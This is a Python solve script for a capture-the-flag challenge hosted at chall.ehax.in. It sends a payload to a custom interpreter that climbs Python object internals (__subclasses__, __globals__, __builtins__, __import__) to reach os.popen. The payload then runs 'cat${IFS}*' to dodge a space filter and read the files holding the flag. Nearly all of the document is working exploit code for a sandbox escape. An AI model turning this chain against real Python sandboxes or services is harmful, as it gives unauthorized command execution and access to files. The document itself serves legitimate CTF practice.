import requests
import re
import html
import re

url = "http://chall.ehax.in:6969"

payload = '''
LD A string
PROP __class__ A
PROP __base__ E
PROP __subclasses__ E

DEL A
DEL B
CALL E

LD A 138
IDX E A

PROP __init__ A
PROP __globals__ E

LD A __builtins__
PROP __getitem__ E
CALL E

LD A __import__
PROP __getitem__ E
CALL E

LD A os
CALL E

PROP popen E

LD A cat${IFS}*
CALL E

DEL A
PROP read E
CALL E

STDOUT E
'''

res = requests.post(f'{url}/run', data={
    'code': payload
})

output = re.findall(r'<pre>(.+)</pre>', res.text.replace('\n', ' '))[0].strip()
output = html.unescape(output)

flag = re.findall(r'(EH4X\{[^}]+\})', output)[0]
print("Flag:", flag)